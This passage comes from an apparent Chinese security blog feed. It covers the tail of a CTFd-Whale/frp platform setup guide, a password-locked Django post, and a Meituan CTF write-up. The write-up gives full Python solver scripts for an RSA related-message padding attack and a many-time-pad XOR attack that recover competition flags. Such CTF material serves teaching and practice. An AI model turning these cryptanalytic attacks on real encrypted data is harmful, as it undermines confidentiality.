<h3 id="frpc-ini"><a href="#frpc-ini" class="headerlink" title="frpc.ini"></a>frpc.ini</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">token &#x3D; randomme</span><br><span class="line">server_addr &#x3D; 172.1.0.1</span><br><span class="line">server_port &#x3D; 6490</span><br><span class="line">pool_count &#x3D; 200</span><br><span class="line">tls_enable &#x3D; true</span><br><span class="line"></span><br><span class="line">admin_addr &#x3D; 172.1.0.3</span><br><span class="line">admin_port &#x3D; 7400</span><br></pre></td></tr></table></figure>
<h3 id="下载CTFd-Whale插件"><a href="#下载CTFd-Whale插件" class="headerlink" title="下载CTFd-Whale插件"></a>下载CTFd-Whale插件</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git submodule update --init  # 初始化CTFd-Whale插件</span><br></pre></td></tr></table></figure>
<h3 id="（可选）修改CTFd平台运行端口"><a href="#（可选）修改CTFd平台运行端口" class="headerlink" title="（可选）修改CTFd平台运行端口"></a>（可选）修改CTFd平台运行端口</h3><p>打开<code>docker-compose.yml</code>，修改CTFd容器的端口信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctfd:</span><br><span class="line">    build: .</span><br><span class="line">    user: root</span><br><span class="line">    restart: always</span><br><span class="line">    ports:</span><br><span class="line">      - &quot;80:8000&quot;  # 意为将外部机器的80端口映射至CTFd容器的8000端口，只需修改前者即可</span><br></pre></td></tr></table></figure>
<h3 id="部署容器"><a href="#部署容器" class="headerlink" title="部署容器"></a>部署容器</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
<p>部署容器，部署完毕后就可以用<code>http://ip:指定的端口</code>访问CTFd进行设置。</p>
<p>参考链接：</p>
<p><a href="https://hujiekang.top/2020/04/26/CTFd-conf/">CTFd平台搭建记录</a></p>
<p><a href="https://www.zhaoj.in/read-6333.html">CTFd-Whale 推荐部署实践</a></p>
<h2 id="配置CTFd-Whale"><a href="#配置CTFd-Whale" class="headerlink" title="配置CTFd-Whale"></a>配置CTFd-Whale</h2><blockquote>
<p>（本次配置中踩的最大的坑）下面提到的所有端口，都需要在<strong>云服务器安全组+系统内防火墙</strong>中开放！！！否则Frp API将无法访问，Frp客户端也无法连接上服务端！！！</p>
</blockquote>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">配置项</th>
<th style="text-align:center">对应值</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">Docker API URL</td>
<td style="text-align:center">unix://var/run/docker.sock</td>
</tr>
<tr>
<td style="text-align:center">Frp API IP</td>
<td style="text-align:center">172.1.0.3</td>
</tr>
<tr>
<td style="text-align:center">Frp API Port</td>
<td style="text-align:center">7400</td>
</tr>
<tr>
<td style="text-align:center">Frp Http Domain Suffix</td>
<td style="text-align:center">None</td>
</tr>
<tr>
<td style="text-align:center">Frp Http Port</td>
<td style="text-align:center">80</td>
</tr>
<tr>
<td style="text-align:center">Frp Direct IP Address</td>
<td style="text-align:center">填入服务器公网IP</td>
</tr>
<tr>
<td style="text-align:center">Frp Direct Minimum Port</td>
<td style="text-align:center">28000</td>
</tr>
<tr>
<td style="text-align:center">Frp Direct Maximum Port</td>
<td style="text-align:center">容器最大的端口值(28100)</td>
</tr>
<tr>
<td style="text-align:center">Max Container Count</td>
<td style="text-align:center">最大允许容器数量(100)</td>
</tr>
<tr>
<td style="text-align:center">Max Renewal Times</td>
<td style="text-align:center">最大允许更新次数(3)</td>
</tr>
<tr>
<td style="text-align:center">Frp config template</td>
<td style="text-align:center">[common]<br/>token = randomme<br/>server_addr = 172.1.0.1<br/>server_port = 6490<br/>pool_count = 200<br/>tls_enable = true<br/><br/>admin_addr = 172.1.0.3<br/>admin_port = 7400</td>
</tr>
<tr>
<td style="text-align:center">Docker Auto Connect Containers</td>
<td style="text-align:center">ctfd_frpc_1（即docker里面frpc容器的名称）</td>
</tr>
<tr>
<td style="text-align:center">Docker Auto Connect Network</td>
<td style="text-align:center">ctfd_frp_containers（即承载开启的题目容器的网络名称）</td>
</tr>
<tr>
<td style="text-align:center">Docker Dns Setting</td>
<td style="text-align:center">可有可无</td>
</tr>
<tr>
<td style="text-align:center">Docker Swarm Nodes</td>
<td style="text-align:center">填入一开始修改的别名(linux-1)</td>
</tr>
<tr>
<td style="text-align:center">Docker Multi-Container Network Subnet</td>
<td style="text-align:center">173.0.0.0/16</td>
</tr>
<tr>
<td style="text-align:center">Docker Multi-Container Network Subnet New Prefix</td>
<td style="text-align:center">24</td>
</tr>
<tr>
<td style="text-align:center">Docker Container Timeout</td>
<td style="text-align:center">容器的存活时间（单位：秒）(3600)</td>
</tr>
</tbody>
</table>
</div>
<h2 id="配置题目"><a href="#配置题目" class="headerlink" title="配置题目"></a>配置题目</h2><p><img src="https://i.loli.net/2021/07/23/JxSgWGnlwKTpihD.png" alt="img"></p>
<p><img src="https://i.loli.net/2021/07/23/OaUQgY9FWpG7ldx.png" alt="img"></p>
<p><img src="https://i.loli.net/2021/07/23/OaUQgY9FWpG7ldx.png" alt=""></p>
<p><img src="https://i.loli.net/2021/07/23/Ynm2AdB8QlebqCi.png" alt="image-20210723110250464"></p>
<h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="https://www.zhaoj.in/read-6333.html">CTFd-Whale 推荐部署实践</a></p>
<p><a href="https://hujiekang.top/2020/04/26/CTFd-conf/">CTFd平台搭建记录</a></p>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>CTFd环境搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>Django项目开发参考资料</title>
    <url>/2021/06/15/Django%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 密码不对呢，为什么不去社工管理员呢？" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="17b99393132b7109a190bf05ffb92ffb7dfc61fb3642fa5b0c0530a8f093f4c2">7ccfaf1f7029b10e37ca00b3f9e0ccb2a13bb745ba77da3fe2b896fe385e6ba734ee173de03bfd955c24f53eae595ddb44399c3c1789d5f7f5a5d2e58eb095e4a14b57bdf22c1feb0949784d9f2c9bd977ae7211782696e985f40aaccbf13dfacea26168b7c7b4619cfb4f83740027c9ed2b83a0f8252b1bc4fb08bd7ef8a53eb6e16c194b5a14dfed5486d67c31e589b27911564939b391734b148ae4dd6eee5789014653302857bddeaa910f26961bde8b7dd7afe6ca096bbad358455f750de96562b978be79dd804783508c96b08d8d2dcbfaaa1ac45419be7ec828356d6f11c3334430498628dd8be7ec6c82fad8b9b389ef606ed9c4486dfbd8e9c857354839f34b2e53b5a8e20ee7e64cb227b0393899cd143a320557a53e0aeb4f72b1dae64bbca77916c1dc5cd6dcc567d03f3bdde3eccd4460543bee2b257bff0726e99efcaea9236c9d57d717c568860e413683c487fa834e97e5096108732e30aac14741e8f3d270e0d618fc96f39eac26b7e4fa8d435913fe49ae682a3f2b7a32550f3a38fcffdd696241a9b638e05b21b3410b2142af3af9293add774efe89e1e38e7defc9ff986e0de148050d1c58c8ea09a96eaa762d73fa6ecf75e1f78131c6624ed57ea31f3433de59b85157699f30c07592cf67a1c702c9dfe1c31b0478907c19b29c78439eb47e2da2885d2858426106316f0223cfdde468d4cba3317f71ff5ecb3daebf64800eaef65d7b4d1bcb11a8ff9690f06ce5c32e4cae576d9032ff796c5ce14fe37055c2150309b5a436a335b0852ee41ea51e1c0358e6ef4f6c01b648986f13ecef80bcad507d8bf7aa0617428ea084cde89e24ed4a215fb97411b8f97630ddffe10ae01eeba789eaf13529e6f41ba0cf46327cdf456a8027232aea82f9a88e7954305a245ecd7b5dcef9d21ac1d37b6efff40eb17346b4a145dd6b8988a03ce45fca828965df9df4b48be45bec47129262cd66515451848ef35e7ab7bb8dac84c432395eac1d12fa5cca76bce9b507d99cb96650fbf15b5b5b576412f3909b35b6953e0536bc9768893a2d25a68adef95d9913766437ab6dd2ef19624cc7353d1b067d686a73e157c62a1434c1243cc425ad3c46d376e23bc2cef057a9cc7ed833c399e91f5016838362236ec63c49557c21d25fd43b83019a010d4e64485c730d0e28361f0a60f2e548329b885b04cfc107ad109594ff372516fef95fb8cbb482c5819f2da341c3eff0ab0bbbc1b9dd30efbdbc7fdcaadc4413f45bfd4d988065c847a74b156c7275be48678a9b91ae235f0151447e60abb9b678eb6ee6f202fe58566b90c48ab18021e6740f87f8cc0b75f8e07384d26671cc4d5b70b8349dee940d20bad0a2b7978bfae85bbed53ca111cc308f47ebc5eb94d04cdc51acb780c6828a7ff9217a41abc6d9bdf71495fdabf58fa4a269d63a84c03df563a78de7622759289229e117cfc474c0596676f40447d09c865a28f4d48398e38afa99eb0948ef4a695eeda94dc1f07ffe513077658a2432aad0ec9d88973d2281ec4677e8910da3b35eda346bb433184be854e3336e6ca2f77d32b735bdac48ff7815a13e94945cacd3548a4c9c0ecf00e257d5de3a014202227f61f5ba15a2984b031511ef526513865861e12f77e1c9949ec6e3b463055dd937dbe096c86bd4ccc784a365ea84a028b50c355f891a764cd9c1952cf4fade28c0bf8d6c0ed88fd3a6ffe8c112f1ba436a1e9afef5201842d3bbce68ed8c508a64f474286e00f3064d6828b6c6704552e1d6b1909fe97ee8e238664062abaf1f0fe473aa6596e7d49878617d77c7938cfb6931bbd5158263648c6a528bdb82d8ace447d894a5023e8c2543e1071acb934496a8953915ee6ed2c36fc6955fca8b4f2a5500b6d51e2e6ec6ef99a2b33b0b7575892319c83610bcb5f4dcb9018f6e506163c33f1e3abb153e3c6a6ca94b8749a11c9ef1e7932188f1d7386217a780fbb0bd721ec42989168f0b98b0d9d44966c2f2935d50b323f88a554526641d70cd1f15828cf032981fc97c8590028e58589dd4c8d25f4101fd76fa583d9d33992cc32fb9a7b2211d4789dc915d359a04dd074bd22155cc22cd8082c3767b30ba3220c9cbb44005c64c1bcb96c05ec4bf2431eb37f1e0bd3fa3115d8d770793877153676106d55434d828bec683ce21e8f3468dd95812e9cf9e097c74cf1beca93e055b130118c108bdfd493d498f182799</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好,接下来的内容需要密码才能阅览。</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>科创</category>
      </categories>
      <tags>
        <tag>Django</tag>
      </tags>
  </entry>
  <entry>
    <title>MTCTF密码部分wp</title>
    <url>/2021/05/25/MTCTF%E5%AF%86%E7%A0%81%E9%83%A8%E5%88%86wp/</url>
    <content><![CDATA[<h1 id="美团CTF密码部分wp"><a href="#美团CTF密码部分wp" class="headerlink" title="美团CTF密码部分wp"></a>美团CTF密码部分wp</h1><p>比赛的时候做出了easy_RSA，然后random的RSA部分做了一半，可惜不懂pwn模块，没写出nc爆破的脚本。RSAsig在第二天复现即将做出来的时候，平台靶机关了，难受。</p>
<span id="more"></span>
<h2 id="easy-RSA"><a href="#easy-RSA" class="headerlink" title="easy_RSA"></a>easy_RSA</h2><p>经典套娃题</p>
<h3 id="第一层"><a href="#第一层" class="headerlink" title="第一层"></a>第一层</h3><h4 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n=<span class="number">0x9371c61a2b760109781f229d43c6f05b58de65aa2a674ff92334cb5219132448d72c1293c145eb6f35e58791669f2d8d3b6ce506f4b3543beb947cf119f463a00bd33a33c4d566c4fd3f4c73c697fa5f3bf65976284b9cc96ec817241385d480003cdda9649fa0995b013e66f583c9a9710f7e18396fbf461cb31720f94a0f79L</span></span><br><span class="line">e=<span class="number">0x3</span></span><br><span class="line">encrypt(m)=<span class="number">0x5f4e03f28702208b215f39f1c8598b77074bfa238dfb9ce424af7cc8a61f7ea48ffbbd5a5e1a10f686c3f240e85d011f6c8b968d1d607b2e1d5a78ad6947b7d3ec8f33ad32489befab601fe745164e4ff4aed7630da89af7f902f6a1bf7266c9c95b29f2c69c33b93a709f282d43b10c61b1a1fe76f5fee970780d7512389fd1L</span></span><br><span class="line">encrypt(m+<span class="number">1</span>)=<span class="number">0x5f4e03f28702208b215f39f1c8598b77074bfa238dfb9ce424af7cc8a61f7ea48ffc5c26b0c12bcff9f697f274f59f0e55a147768332fc1f1bac5bbc8f9bb508104f232bdd20091d26adc52e36feda4a156eae7dce4650f83fabc828fdcfb01d25efb98db8b94811ca855a6aa77caff991e7b986db844ff7a140218449aaa7e8L</span></span><br></pre></td></tr></table></figure>
<h4 id="解答："><a href="#解答：" class="headerlink" title="解答："></a>解答：</h4><p>原题，一个字不改的，直接上exp了：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getM2</span>(<span class="params">a,b,c1,c2,n,e</span>):</span></span><br><span class="line">    a3 = <span class="built_in">pow</span>(a,e,n)</span><br><span class="line">    b3 = <span class="built_in">pow</span>(b,e,n)</span><br><span class="line">    first = c1-a3*c2+<span class="number">2</span>*b3</span><br><span class="line">    first = first % n</span><br><span class="line">    second = e*b*(a3*c2-b3)</span><br><span class="line">    second = second % n</span><br><span class="line">    third = second*inverse(first,n)</span><br><span class="line">    third = third % n</span><br><span class="line">    fourth = (third+b)*inverse(a,n)</span><br><span class="line">    <span class="keyword">return</span> fourth % n</span><br><span class="line">e=<span class="number">0x3</span></span><br><span class="line">a=<span class="number">1</span></span><br><span class="line">b=-<span class="number">1</span></span><br><span class="line">c1=<span class="number">0x5f4e03f28702208b215f39f1c8598b77074bfa238dfb9ce424af7cc8a61f7ea48ffbbd5a5e1a10f686c3f240e85d011f6c8b968d1d607b2e1d5a78ad6947b7d3ec8f33ad32489befab601fe745164e4ff4aed7630da89af7f902f6a1bf7266c9c95b29f2c69c33b93a709f282d43b10c61b1a1fe76f5fee970780d7512389fd1</span></span><br><span class="line">c2=<span class="number">0x5f4e03f28702208b215f39f1c8598b77074bfa238dfb9ce424af7cc8a61f7ea48ffc5c26b0c12bcff9f697f274f59f0e55a147768332fc1f1bac5bbc8f9bb508104f232bdd20091d26adc52e36feda4a156eae7dce4650f83fabc828fdcfb01d25efb98db8b94811ca855a6aa77caff991e7b986db844ff7a140218449aaa7e8</span></span><br><span class="line">padding2=<span class="number">1</span></span><br><span class="line">n=<span class="number">0x9371c61a2b760109781f229d43c6f05b58de65aa2a674ff92334cb5219132448d72c1293c145eb6f35e58791669f2d8d3b6ce506f4b3543beb947cf119f463a00bd33a33c4d566c4fd3f4c73c697fa5f3bf65976284b9cc96ec817241385d480003cdda9649fa0995b013e66f583c9a9710f7e18396fbf461cb31720f94a0f79</span></span><br><span class="line">m = getM2(a,b,c1,c2,n,e)-padding2</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<p>解出来</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">the key is :everything_is_easy_in_this_question</span><br></pre></td></tr></table></figure>
<p>即为压缩包密码，然后进入第二层</p>
<h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><p>原理参考：<a href="https://www.anquanke.com/post/id/158944">浅析RSA Padding Attack</a></p>
<p>脚本参考：<a href="https://xz.aliyun.com/t/6459">深入浅出RSA在CTF中的攻击套路</a></p>
<h3 id="第二层"><a href="#第二层" class="headerlink" title="第二层"></a>第二层</h3><p>题目给了提示，one_time_cipher，一次一密。额，又是原题，但不完全是。需要修改一下。</p>
<h4 id="题目"><a href="#题目" class="headerlink" title="题目:"></a>题目:</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">280316470206017f5f163a3460100b111b2c254e103715600f13,</span><br><span class="line">091b0f471d05153811122c70340c0111053a394e0b39500f0a18,</span><br><span class="line">4638080a1e49243e55531a3e23161d411a362e4044111f374409,</span><br><span class="line">0e0d15470206017f59122935601405421d3a244e10371560140f,</span><br><span class="line">031a08080e1a540d62327f242517101d4e2b2807177f13280511,</span><br><span class="line">0a090f001e491d2c111d3024601405431a36231b083e022c1d,</span><br><span class="line">16000406080c543854077f24280144451c2a254e093a0333051a,</span><br><span class="line">02050701120a01334553393f32441d5e1b716027107f19334417,</span><br><span class="line">131f15470800192f5d167f352e0716481e2b29010a7139600c12,</span><br><span class="line">1609411e141c543c501d7f232f0812544e2b2807177f00320b1f,</span><br><span class="line">0a090c470a1c1d3c5a1f2670210a0011093a344e103715600712,</span><br><span class="line">141e04040f49153142043a22601711520d3a331d0826</span><br></pre></td></tr></table></figure>
<h4 id="解答：-1"><a href="#解答：-1" class="headerlink" title="解答："></a>解答：</h4><p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">## OTP - Recovering the private key from a set of messages that were encrypted w/ the same private key (Many time pad attack) - crypto100-many_time_secret @ alexctf 2017</span></span><br><span class="line"><span class="comment"># @author intrd - http://dann.com.br/ </span></span><br><span class="line"><span class="comment"># Original code by jwomers: https://github.com/Jwomers/many-time-pad-attack/blob/master/attack.py)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"><span class="keyword">import</span> sets, sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 11 unknown ciphertexts (in hex format), all encrpyted with the same key</span></span><br><span class="line"></span><br><span class="line">c1 = <span class="string">"280316470206017f5f163a3460100b111b2c254e103715600f13"</span></span><br><span class="line">c2 = <span class="string">"091b0f471d05153811122c70340c0111053a394e0b39500f0a18"</span></span><br><span class="line">c3 = <span class="string">"4638080a1e49243e55531a3e23161d411a362e4044111f374409"</span></span><br><span class="line">c4 = <span class="string">"0e0d15470206017f59122935601405421d3a244e10371560140f"</span></span><br><span class="line">c5 = <span class="string">"031a08080e1a540d62327f242517101d4e2b2807177f13280511"</span></span><br><span class="line">c6 = <span class="string">"0a090f001e491d2c111d3024601405431a36231b083e022c1d"</span></span><br><span class="line">c7 = <span class="string">"16000406080c543854077f24280144451c2a254e093a0333051a"</span></span><br><span class="line">c8 = <span class="string">"02050701120a01334553393f32441d5e1b716027107f19334417"</span></span><br><span class="line">c9 = <span class="string">"131f15470800192f5d167f352e0716481e2b29010a7139600c12"</span></span><br><span class="line">c10 = <span class="string">"1609411e141c543c501d7f232f0812544e2b2807177f00320b1f"</span></span><br><span class="line">c11 = <span class="string">"0a090c470a1c1d3c5a1f2670210a0011093a344e103715600712"</span></span><br><span class="line">ciphers = [c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, c11]</span><br><span class="line"><span class="comment"># The target ciphertext we want to crack</span></span><br><span class="line">target_cipher = <span class="string">"141e04040f49153142043a22601711520d3a331d0826"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># XORs two string</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strxor</span>(<span class="params">a, b</span>):</span>     <span class="comment"># xor two strings (trims the longer input)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>.join([<span class="built_in">chr</span>(<span class="built_in">ord</span>(x) ^ <span class="built_in">ord</span>(y)) <span class="keyword">for</span> (x, y) <span class="keyword">in</span> <span class="built_in">zip</span>(a, b)])</span><br><span class="line"></span><br><span class="line"><span class="comment"># To store the final key</span></span><br><span class="line">final_key = [<span class="literal">None</span>]*<span class="number">150</span></span><br><span class="line"><span class="comment"># To store the positions we know are broken</span></span><br><span class="line">known_key_positions = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># For each ciphertext</span></span><br><span class="line"><span class="keyword">for</span> current_index, ciphertext <span class="keyword">in</span> <span class="built_in">enumerate</span>(ciphers):</span><br><span class="line">	counter = collections.Counter()</span><br><span class="line">	<span class="comment"># for each other ciphertext</span></span><br><span class="line">	<span class="keyword">for</span> index, ciphertext2 <span class="keyword">in</span> <span class="built_in">enumerate</span>(ciphers):</span><br><span class="line">		<span class="keyword">if</span> current_index != index: <span class="comment"># don't xor a ciphertext with itself</span></span><br><span class="line">			<span class="keyword">for</span> indexOfChar, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(strxor(ciphertext.decode(<span class="string">'hex'</span>), ciphertext2.decode(<span class="string">'hex'</span>))): <span class="comment"># Xor the two ciphertexts</span></span><br><span class="line">				<span class="comment"># If a character in the xored result is a alphanumeric character, it means there was probably a space character in one of the plaintexts (we don't know which one)</span></span><br><span class="line">				<span class="keyword">if</span> char <span class="keyword">in</span> string.printable <span class="keyword">and</span> char.isalpha(): counter[indexOfChar] += <span class="number">1</span> <span class="comment"># Increment the counter at this index</span></span><br><span class="line">	knownSpaceIndexes = []</span><br><span class="line"></span><br><span class="line">	<span class="comment"># Loop through all positions where a space character was possible in the current_index cipher</span></span><br><span class="line">	<span class="keyword">for</span> ind, val <span class="keyword">in</span> counter.items():</span><br><span class="line">		<span class="comment"># If a space was found at least 7 times at this index out of the 9 possible XORS, then the space character was likely from the current_index cipher!</span></span><br><span class="line">		<span class="keyword">if</span> val &gt;= <span class="number">7</span>: knownSpaceIndexes.append(ind)</span><br><span class="line">	<span class="comment">#print knownSpaceIndexes # Shows all the positions where we now know the key!</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># Now Xor the current_index with spaces, and at the knownSpaceIndexes positions we get the key back!</span></span><br><span class="line">	xor_with_spaces = strxor(ciphertext.decode(<span class="string">'hex'</span>),<span class="string">' '</span>*<span class="number">150</span>)</span><br><span class="line">	<span class="keyword">for</span> index <span class="keyword">in</span> knownSpaceIndexes:</span><br><span class="line">		<span class="comment"># Store the key's value at the correct position</span></span><br><span class="line">		final_key[index] = xor_with_spaces[index].encode(<span class="string">'hex'</span>)</span><br><span class="line">		<span class="comment"># Record that we known the key at this position</span></span><br><span class="line">		known_key_positions.add(index)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Construct a hex key from the currently known key, adding in '00' hex chars where we do not know (to make a complete hex string)</span></span><br><span class="line">final_key_hex = <span class="string">''</span>.join([val <span class="keyword">if</span> val <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="string">'00'</span> <span class="keyword">for</span> val <span class="keyword">in</span> final_key])</span><br><span class="line"><span class="comment"># Xor the currently known key with the target cipher</span></span><br><span class="line">output = strxor(target_cipher.decode(<span class="string">'hex'</span>),final_key_hex.decode(<span class="string">'hex'</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">"Fix this sentence:"</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">''</span>.join([char <span class="keyword">if</span> index <span class="keyword">in</span> known_key_positions <span class="keyword">else</span> <span class="string">'*'</span> <span class="keyword">for</span> index, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(output)])+<span class="string">"\n"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># WAIT.. MANUAL STEP HERE </span></span><br><span class="line"><span class="comment"># This output are printing a * if that character is not known yet</span></span><br><span class="line"><span class="comment"># fix the missing characters like this: "Let*M**k*ow if *o{*a" = "cure, Let Me know if you a"</span></span><br><span class="line"><span class="comment"># if is too hard, change the target_cipher to another one and try again</span></span><br><span class="line"><span class="comment"># and we have our key to fix the entire text!</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sys.exit(0) #comment and continue if u got a good key</span></span><br><span class="line">list1=<span class="string">' abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">		<span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line"></span><br><span class="line">			target_plaintext = <span class="string">"r{0}e{1}{2} answer successly"</span>.<span class="built_in">format</span>(list1[i],list1[j],list1[k])</span><br><span class="line"><span class="comment"># print "Fixed:"</span></span><br><span class="line"><span class="comment"># print target_plaintext+"\n"</span></span><br><span class="line"></span><br><span class="line">			key = strxor(target_cipher.decode(<span class="string">'hex'</span>),target_plaintext)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print "Decrypted msg:"</span></span><br><span class="line"><span class="comment">#for cipher in ciphers:</span></span><br><span class="line"><span class="comment">#	print strxor(cipher.decode('hex'),key)</span></span><br><span class="line">			<span class="keyword">if</span> <span class="string">'flag{'</span> <span class="keyword">in</span> key:</span><br><span class="line">				<span class="built_in">print</span> target_plaintext</span><br><span class="line">				<span class="built_in">print</span> <span class="string">"\nPrivate key recovered: "</span>+key+<span class="string">"\n"</span></span><br><span class="line">				<span class="keyword">for</span> cipher <span class="keyword">in</span> ciphers:</span><br><span class="line">					<span class="built_in">print</span> strxor(cipher.decode(<span class="string">'hex'</span>),key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print "Fixed:"</span></span><br><span class="line"><span class="comment"># print target_plaintext+"\n"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># key = strxor(target_cipher.decode('hex'),target_plaintext)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print "Decrypted msg:"</span></span><br><span class="line"><span class="comment"># for cipher in ciphers:</span></span><br><span class="line"><span class="comment"># 	print strxor(cipher.decode('hex'),key)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print "\nPrivate key recovered: "+key+"\n"</span></span><br></pre></td></tr></table></figure>
<p>得到的密文为<code>r*e** answer succks*ly</code></p>
<p>爆破恢复+猜测后，得到实际密文:<code>rrect answer successly</code></p>
<p>明文段落：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Now you need to use th</span><br><span class="line">own flag as the key of</span><br><span class="line"> Time Pad Encryptin. N</span><br><span class="line">hat you have passed th</span><br><span class="line">evious RSA test, this </span><br><span class="line">lenge is not particula</span><br><span class="line">please get the true me</span><br><span class="line">difficult for you. It </span><br><span class="line">ust simple encryption.</span><br><span class="line">pe you can solve this </span><br><span class="line">lem quickly and get th</span><br><span class="line">rrect answer successly</span><br></pre></td></tr></table></figure>
<p>得到flag：<code>flag{it_1s_P@dd1n_@nd_</code>好恶心啊，缺了几个字符。</p>
<p>仔细看明文出来的，缺了字母，恶心坏了。</p>
<p>缺了4个字节，最后一个字节肯定是<code>}</code>，复原第八行明文后异或爆破前三位，得到flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor_bytes</span>(<span class="params">key_stream, message</span>):</span></span><br><span class="line">    length = <span class="built_in">min</span>(<span class="built_in">len</span>(key_stream), <span class="built_in">len</span>(message))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([key_stream[i]^ message[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length)])</span><br><span class="line"> </span><br><span class="line">message = <span class="string">b"difficult for you. It is j"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">            key_stream = <span class="string">b'flag{it_1s_P@dd1n_@nd_'</span>+<span class="string">f'<span class="subst">{<span class="built_in">chr</span>(i)}</span>'</span>.encode()+<span class="string">f'<span class="subst">{<span class="built_in">chr</span>(j)}</span>'</span>.encode()+<span class="string">f'<span class="subst">{<span class="built_in">chr</span>(k)}</span>'</span>.encode()+<span class="string">b'}'</span></span><br><span class="line">            cipher = xor_bytes(key_stream, message)</span><br><span class="line">            <span class="keyword">if</span> cipher.<span class="built_in">hex</span>() == <span class="string">"02050701120a01334553393f32441d5e1b716027107f19334417"</span>:</span><br><span class="line">                <span class="built_in">print</span>(key_stream)</span><br><span class="line">                <span class="built_in">print</span>(cipher.<span class="built_in">hex</span>())</span><br><span class="line">                <span class="built_in">print</span>(xor_bytes(key_stream, cipher))</span><br></pre></td></tr></table></figure>
<h4 id="参考链接：-1"><a href="#参考链接：-1" class="headerlink" title="参考链接："></a>参考链接：</h4><p><a href="http://dann.com.br/alexctf2k17-crypto100-many_time_secrets/">alexctf2k17-crypto100</a>（类似例题有杭电2019week1）</p>
<p><a href="https://www.wkr.moe/ctf/536.html">Wankko ReeのBlog</a></p>
